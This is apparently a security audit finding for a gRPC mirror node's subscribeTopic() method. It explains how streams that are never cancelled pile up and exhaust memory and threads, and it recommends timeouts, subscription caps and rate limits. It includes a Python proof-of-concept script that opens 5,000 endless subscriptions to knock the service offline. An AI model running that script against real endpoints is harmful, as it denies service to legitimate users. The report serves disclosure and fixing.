### Title
Unbounded Subscription Accumulation via Missing Server-Side Lifecycle Enforcement in `subscribeTopic()`

### Summary
The `subscribeTopic()` method in `ConsensusController` subscribes to a Reactor pipeline and registers cleanup exclusively via `setOnCancelHandler(disposable::dispose)`, which only fires when the client sends a gRPC cancel signal. An unprivileged attacker who opens many streams with no `limit` and no `endTime` and never sends a cancel signal causes each subscription's `Disposable` — along with its associated `TopicContext`, per-subscriber backpressure buffer (up to 16,384 items), and bounded-elastic scheduler work — to accumulate indefinitely, enabling memory exhaustion and thread-pool starvation.

### Finding Description

**Exact code path:**

In `ConsensusController.subscribeTopic()` (lines 43–52):

```java
final var disposable = Mono.fromCallable(() -> toFilter(request))
        .flatMapMany(topicMessageService::subscribeTopic)
        .map(this::toResponse)
        .onErrorMap(ProtoUtil::toStatusRuntimeException)
        .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
    serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
}
``` [1](#0-0) 

**Root cause — failed assumption:** The code assumes the client will eventually send a gRPC cancel signal. There is no server-side idle timeout, no maximum concurrent subscription count, and no authentication gate. The `setOnCancelHandler` is the **sole** cleanup path for the `Disposable`.

**Per-subscription resource cost:**

Each open subscription allocates:
1. A `TopicContext` with an `AtomicLong`, `AtomicReference`, and `Stopwatch`.
2. A per-subscriber backpressure buffer of up to `maxBufferSize = 16,384` items in `SharedTopicListener.listen()`.
3. A `Mono.delay(1s).subscribeOn(Schedulers.boundedElastic())` safety-check task scheduled on the bounded-elastic thread pool.
4. For `ListenerType.POLL`, each subscriber creates its own independent polling loop against the database via `topicListener.listen(newFilter)`. [2](#0-1) [3](#0-2) 

**Why streams never self-terminate:**

`TopicMessageFilter` defaults `limit` to `0`, and `hasLimit()` returns `false` when `limit == 0`. If the client omits `endTime`, `pastEndTime()` returns `Flux.never()`. The combined pipeline therefore never emits a terminal signal from the server side. [4](#0-3) [5](#0-4) 

**Existing checks reviewed and shown insufficient:**

- `maxBufferSize = 16,384` limits per-subscriber buffer depth but does not cap the number of subscribers.
- `subscriberCount` gauge (line 52–55) is metrics-only; it does not enforce any ceiling.
- `Schedulers.boundedElastic()` caps threads at `10 × CPU cores` by default; with enough concurrent subscriptions all issuing safety-check tasks simultaneously, this pool saturates.
- No authentication, rate limiting, or per-IP connection cap exists in the controller or filter layer. [6](#0-5) [7](#0-6) 

### Impact Explanation

An attacker can exhaust JVM heap by accumulating thousands of live subscriptions each holding a 16,384-item buffer. Separately, when the topic is active and messages flow, each subscription's `publishOn(Schedulers.boundedElastic())` competes for threads; with the POLL listener type, each subscription also drives its own database polling loop, directly starving the bounded-elastic pool and blocking all other reactive work (including legitimate subscriptions and safety-check tasks). Either path results in an effective denial of service of the gRPC mirror node, preventing any client from receiving HCS topic messages.

### Likelihood Explanation

No privileges, credentials, or special network position are required. The gRPC endpoint is publicly reachable. A single attacker script can open thousands of HTTP/2 streams (gRPC multiplexes over one TCP connection) in seconds, each with `limit=0` and no `endTime`, and simply never send `RST_STREAM`. Keepalive pings detect dead TCP connections but not a live client that deliberately withholds cancel. The attack is trivially repeatable and scriptable with any gRPC client library.

### Recommendation

1. **Server-side subscription timeout**: Apply `.timeout(maxSubscriptionDuration)` on the Flux before `.subscribe()`, or use `ServerCallStreamObserver.setOnReadyHandler` combined with a scheduled cleanup task.
2. **Maximum concurrent subscription cap**: Enforce a configurable ceiling (e.g., via a `Semaphore` or `AtomicLong` guard) in `TopicMessageServiceImpl.subscribeTopic()` and reject new subscriptions with `RESOURCE_EXHAUSTED` when the limit is reached.
3. **Per-IP / per-client rate limiting**: Integrate a gRPC interceptor that tracks open streams per remote address and rejects excess connections.
4. **Idle-stream eviction**: Track the last-message timestamp per subscription and forcibly dispose subscriptions that have been idle beyond a configurable threshold.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

def open_zombie_subscription(channel):
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        # limit=0 (default) → no limit, no endTime → stream never terminates server-side
    )
    # Iterate but never break and never cancel — keep the stream open indefinitely
    for _ in stub.subscribeTopic(query):
        pass  # attacker simply blocks here, holding the subscription open

channel = grpc.insecure_channel("mirror-node-grpc:5600")
threads = []
for _ in range(5000):  # open 5000 concurrent zombie subscriptions
    t = threading.Thread(target=open_zombie_subscription, args=(channel,), daemon=True)
    t.start()
    threads.append(t)

# All 5000 Disposables now accumulate on the server with no cleanup path.
# Monitor server heap and hiero.mirror.grpc.subscribers metric climbing without bound.
input("Press enter to release (attacker never does this in a real attack)")
```

Observed result: `hiero.mirror.grpc.subscribers` climbs to 5,000; JVM heap grows proportionally to `5000 × maxBufferSize × avg_message_size`; bounded-elastic thread pool saturates when the topic receives messages; legitimate subscribers receive no responses or `UNAVAILABLE` errors.

    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }

        return Flux.empty()
                .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                        .withFixedDelay(grpcProperties.getEndTimeInterval()));
    }
